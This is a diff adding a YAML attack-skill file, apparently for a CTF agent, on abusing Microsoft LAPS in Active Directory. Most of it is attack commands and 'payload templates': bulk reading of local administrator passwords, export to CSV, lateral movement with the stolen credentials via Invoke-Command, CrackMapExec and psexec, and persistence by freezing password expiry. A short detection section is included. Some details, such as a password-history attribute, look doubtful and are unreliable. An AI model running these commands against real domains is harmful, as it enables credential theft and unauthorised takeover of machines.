@@ -1,0 +1,391 @@
+name: laps_attack
+description: LAPS攻击 - Local Administrator Password Solution攻击技术，读取和管理本地管理员密码，实现横向移动和权限提升
+version: "2.0"
+author: CTF-Agent Team
+tags: [laps, local-admin, password-theft, lateral-movement, active-directory]
+priority: high
+
+# 使用场景
+scenarios:
+  - LAPS密码读取和破解
+  - 本地管理员权限获取
+  - 横向移动到LAPS管理主机
+  - LAPS配置错误利用
+  - 域内主机批量接管
+
+# 核心技术
+techniques:
+  - LAPS Password Reading: 读取LAPS存储的本地管理员密码
+  - LAPS ACL Abuse: 滥用LAPS ACL配置错误
+  - LAPS Group Membership: 利用LAPS管理组权限
+  - Password History Exploitation: 利用密码历史记录
+  - LAPS AdmPwd.dll Abuse: 利用AdmPwd DLL读取密码
+
+# 工具列表
+tools:
+  - Get-LAPSPasswords: PowerShell LAPS密码读取
+  - LAPSToolkit: LAPS审计和利用工具
+  - PowerView: AD枚举
+  - AdmPwd.ps: PowerShell LAPS模块
+  - SharpLAPS: C# LAPS工具
+  - LAPS UI: LAPS图形界面工具
+  - CrackMapExec: LAPS密码提取
+  - BloodHound: LAPS权限路径分析
+
+# LAPS基础
+basics:
+  - concept: |
+      # LAPS概述
+
+      # LAPS是什么?
+      # - Microsoft提供的本地管理员密码管理方案
+      # - 自动管理每台主机的本地管理员密码
+      # - 密码存储在AD计算机对象的属性中
+
+      # 密码存储位置:
+      # - ms-MCS-AdmPwd: 明文密码
+      # - ms-MCS-AdmPwdExpirationTime: 密码过期时间
+
+      # LAPS组件:
+      # - LAPS Agent (安装在每台主机)
+      # - LAPS UI (管理界面)
+      # - LAPS PowerShell Module
+      # - AD扩展 (存储密码的属性)
+
+  - security_model: |
+      # LAPS安全模型
+
+      # 权限控制:
+      # - ms-MCS-AdmPwd读取权限
+      # - ms-MCS-AdmPwdExpirationTime写入权限
+
+      # 默认组:
+      # - Domain Admins: 可读取所有密码
+      # - LAPS Administrators: 特定管理组
+
+      # 常见配置错误:
+      # - All Users可读取密码
+      # - 特定用户有过度权限
+      # - OU级别的权限继承错误
+
+# 信息收集
+reconnaissance:
+  - laps_detection: |
+      # 检测LAPS部署
+
+      # 检查LAPS属性
+      Get-ADObject -LDAPFilter "(objectClass=computer)" -Properties ms-MCS-AdmPwdExpirationTime
+
+      # 检查LAPS扩展
+      Get-ADObject -SearchBase "CN=Schema,CN=Configuration,DC=domain,DC=local" -LDAPFilter "(name=ms-MCS-AdmPwd*)"
+
+      # 使用PowerView
+      Get-DomainComputer -LDAPFilter "(ms-MCS-AdmPwdExpirationTime=*)" | Select-Object name, ms-MCS-AdmPwdExpirationTime
+
+      # 检查LAPS OU
+      Get-DomainOU | Where-Object {$_.Name -like "*LAPS*"}
+
+  - acl_analysis: |
+      # LAPS ACL分析
+
+      # 使用LAPSToolkit
+      Import-Module LAPSToolkit
+      Get-LAPSACL -Domain domain.local
+
+      # 检查谁可以读取密码
+      Find-LAPSDelegatedGroups
+
+      # 检查特定计算机的ACL
+      Get-DomainComputer -Name "COMPUTER$" -Properties ms-MCS-AdmPwd | Get-ObjectAcl -ResolveGUIDs
+
+      # 手动检查
+      $computer = Get-ADComputer "TargetPC"
+      (Get-ACL "AD:\$computer.DistinguishedName").Access | Where-Object {
+        $_.ObjectType -eq "28630ebc-41d5-11d1-a9c1-0000f80367c1"
+      }
+
+  - password_readers: |
+      # 查找密码读取权限
+
+      # 使用LAPSToolkit
+      Find-LAPSDelegatedGroupReaders
+
+      # 使用PowerView
+      Get-DomainComputer | ForEach-Object {
+        $_.name
+        (Get-ObjectAcl -SamAccountName $_.name -ResolveGUIDs).Where({
+          $_.ObjectType -eq "28630ebc-41d5-11d1-a9c1-0000f80367c1" -and $_.AccessRight -eq "ReadProperty"
+        }).IdentityReference
+      }
+
+      # BloodHound分析
+      # 查找有LAPS密码读取权限的用户
+
+# 密码读取攻击
+attack_techniques:
+  - getlapspasswords: |
+      # 使用Get-LAPSPasswords
+
+      Import-Module Get-LAPSPasswords
+
+      # 读取所有可访问的LAPS密码
+      Get-LAPSPasswords -Domain domain.local
+
+      # 按OU筛选
+      Get-LAPSPasswords -OU "OU=Servers,DC=domain,DC=local"
+
+      # 按计算机名筛选
+      Get-LAPSPasswords -ComputerName "PC001"
+
+      # 显示详细信息
+      Get-LAPSPasswords -Domain domain.local | Format-Table ComputerName, Password, PasswordExpiration
+
+  - admpwd_ps: |
+      # 使用AdmPwd.ps
+
+      Import-Module AdmPwd
+
+      # 查找有读取权限的计算机
+      Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=domain,DC=local"
+
+      # 读取密码
+      Get-AdmPwdPassword -ComputerName "TargetPC"
+
+      # 批量读取
+      Get-ADComputer -Filter * | ForEach-Object {
+        try {
+          $pwd = Get-AdmPwdPassword -ComputerName $_.Name
+          Write-Host "$($_.Name): $pwd"
+        } catch {}
+      }
+
+  - powerView_method: |
+      # 使用PowerView读取
+
+      # 直接读取属性(如果有权限)
+      Get-DomainComputer -Identity "TargetPC" -Properties ms-MCS-AdmPwd
+
+      # 批量读取
+      Get-DomainComputer -LDAPFilter "(ms-MCS-AdmPwdExpirationTime=*)" -Properties ms-MCS-AdmPwd,ms-MCS-AdmPwdExpirationTime
+
+      # 过滤可读的计算机
+      Get-DomainComputer | Where-Object {
+        (Get-ObjectAcl $_.distinguishedname -ResolveGUIDs).Where({
+          $_.ObjectType -eq "28630ebc-41d5-11d1-a9c1-0000f80367c1" -and
+          $_.IdentityReference -match "CurrentUser"
+        })
+      } | Get-DomainComputer -Properties ms-MCS-AdmPwd
+
+  - crackmapexec_method: |
+      # 使用CrackMapExec
+
+      # LAPS密码提取
+      crackmapexec ldap domain.local -u user -p password -M laps
+
+      # 指定DC
+      crackmapexec ldap 192.168.1.10 -u user -p password -d domain.local -M laps
+
+      # 导出结果
+      crackmapexec ldap domain.local -u user -p password -M laps --laps-output laps.txt
+
+  - sharplaps_method: |
+      # 使用SharpLAPS
+
+      SharpLAPS.exe /domain:domain.local /user:user /password:password
+
+      # 指定计算机
+      SharpLAPS.exe /computer:TargetPC /domain:domain.local /user:user /password:password
+
+      # 指定OU
+      SharpLAPS.exe /ou:"OU=Servers,DC=domain,DC=local" /domain:domain.local
+
+# ACL滥用攻击
+acl_abuse:
+  - technique: |
+      # LAPS ACL滥用
+
+      # 如果有以下权限:
+      # - AllExtendedRights
+      # - ReadProperty (对ms-MCS-AdmPwd)
+
+      # 场景1: 有对OU的AllExtendedRights
+      # 可以读取该OU下所有计算机的LAPS密码
+
+      # 检查权限
+      Get-ObjectAcl -ADPath "OU=Workstations,DC=domain,DC=local" -ResolveGUIDs
+
+      # 如果发现AllExtendedRights (GUID: 00000000-0000-0000-0000-000000000000)
+      # 可以读取该OU下所有LAPS密码
+
+      Get-DomainComputer -SearchBase "OU=Workstations,DC=domain,DC=local" -Properties ms-MCS-AdmPwd
+
+      # 场景2: 有WriteProperty (对ms-MCS-AdmPwdExpirationTime)
+      # 可以重置密码过期时间，触发密码更新
+
+      Set-DomainObject -Identity "TargetPC$" -Set @{ms-MCS-AdmPwdExpirationTime="0"}
+
+# 密码历史利用
+password_history:
+  - technique: |
+      # 密码历史利用
+
+      # LAPS可能存储密码历史
+      # 检查密码历史属性
+
+      Get-ADComputer -Identity "TargetPC" -Properties ms-MCS-PasswordHistory
+
+      # 如果密码历史可读，可能包含旧密码
+      # 用户可能仍在使用旧密码
+
+      # 检查密码策略
+      # 密码复杂度要求
+      # 密码长度要求
+
+# 横向移动
+lateral_movement:
+  - technique: |
+      # 使用LAPS密码横向移动
+
+      # 1. 获取目标主机LAPS密码
+      $laps = Get-AdmPwdPassword -ComputerName "TargetPC"
+
+      # 2. 使用本地管理员账户登录
+      $cred = New-Object System.Management.Automation.PSCredential("TargetPC\Administrator", (ConvertTo-SecureString $laps.Password -AsPlainText -Force))
+
+      # 3. 远程执行
+      Invoke-Command -ComputerName TargetPC -Credential $cred -ScriptBlock {
+        whoami
+        # 执行更多命令
+      }
+
+      # 4. 使用WinRM
+      Enter-PSSession -ComputerName TargetPC -Credential $cred
+
+      # 5. 使用CrackMapExec
+      crackmapexec smb TargetPC -u Administrator -p $laps.Password
+
+      # 6. 使用Impacket
+      python psexec.py TargetPC/Administrator:$laps.Password@TargetPC
+
+# 持久化
+persistence:
+  - technique: |
+      # LAPS持久化
+
+      # 方法1: 维持LAPS读取权限
+      # 保持对LAPS管理组的成员身份
+
+      # 方法2: 定期读取密码
+      # 监控密码更新，定期读取新密码
+
+      # 方法3: 禁用密码更新
+      # 设置密码过期时间为极大值
+      Set-ADComputer -Identity "TargetPC" -Replace @{ms-MCS-AdmPwdExpirationTime="9999999999"}
+
+      # 方法4: 安装后门
+      # 在获取本地管理员权限后安装持久化后门
+
+# 检测和防御
+defense:
+  - detection: |
+      # 检测LAPS攻击
+
+      # 1. 监控ms-MCS-AdmPwd读取
+      # 事件ID: 4662 (对象访问)
+      # ObjectType: 28630ebc-41d5-11d1-a9c1-0000f80367c1
+
+      # 2. 监控异常的密码读取模式
+      # 批量读取多台计算机密码
+
+      # 3. 审计ACL变更
+
+      # 4. 监控LAPS管理组成员变更
+
+      # PowerShell检测脚本
+      Get-WinEvent -FilterHashtable @{
+        LogName='Security'
+        ID=4662
+      } | Where-Object {
+        $_.Message -match "28630ebc-41d5-11d1-a9c1-0000f80367c1"
+      }
+
+  - mitigation: |
+      # 缓解措施
+
+      # 1. 严格限制读取权限
+      # 只授予必要的管理员
+
+      # 2. 定期审计ACL
+      # 使用LAPSToolkit定期审计
+
+      # 3. 监控密码读取日志
+
+      # 4. 使用分层管理组
+      # 不同OU使用不同的管理组
+
+      # 5. 密码复杂度要求
+      # 设置足够的密码长度和复杂度
+
+# 完整攻击流程
+attack_chain:
+  - step1: "检测LAPS部署"
+  - step2: "分析LAPS ACL权限"
+  - step3: "识别可读取密码的计算机"
+  - step4: "读取LAPS密码"
+  - step5: "使用本地管理员密码横向移动"
+  - step6: "在目标主机执行操作"
+  - step7: "维持权限持久化"
+
+# Payload模板
+payloads:
+  - name: "LAPS密码批量读取"
+    template: |
+      # LAPS密码批量读取Payload
+
+      Import-Module Get-LAPSPasswords
+
+      # 读取所有密码
+      $laps = Get-LAPSPasswords -Domain domain.local
+
+      # 输出结果
+      $laps | ForEach-Object {
+        Write-Host "Computer: $($_.ComputerName)"
+        Write-Host "Password: $($_.Password)"
+        Write-Host "Expiration: $($_.PasswordExpiration)"
+        Write-Host "---"
+      }
+
+      # 保存到文件
+      $laps | Export-Csv -Path "laps_passwords.csv" -NoTypeInformation
+
+  - name: "LAPS横向移动"
+    template: |
+      # LAPS横向移动Payload
+
+      Import-Module AdmPwd
+
+      # 获取目标密码
+      $target = "TargetPC"
+      $pwd = Get-AdmPwdPassword -ComputerName $target
+
+      # 创建凭据
+      $cred = New-Object System.Management.Automation.PSCredential(
+        "$target\Administrator",
+        (ConvertTo-SecureString $pwd.Password -AsPlainText -Force)
+      )
+
+      # 横向移动
+      Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock {
+        # 执行命令
+        net user
+        whoami /all
+      }
+
+# 参考资源
+references:
+  - https://github.com/PowerShellMafia/PowerSploit
+  - https://github.com/leakedsecurity/LAPSToolkit
+  - https://github.com/kfosaaen/Get-LAPSPasswords
+  - https://github.com/GhostPack/SharpLAPS
+  - https://adsecurity.org/?p=1790
+  - https://www.microsoft.com/en-us/download/details.aspx?id=46899
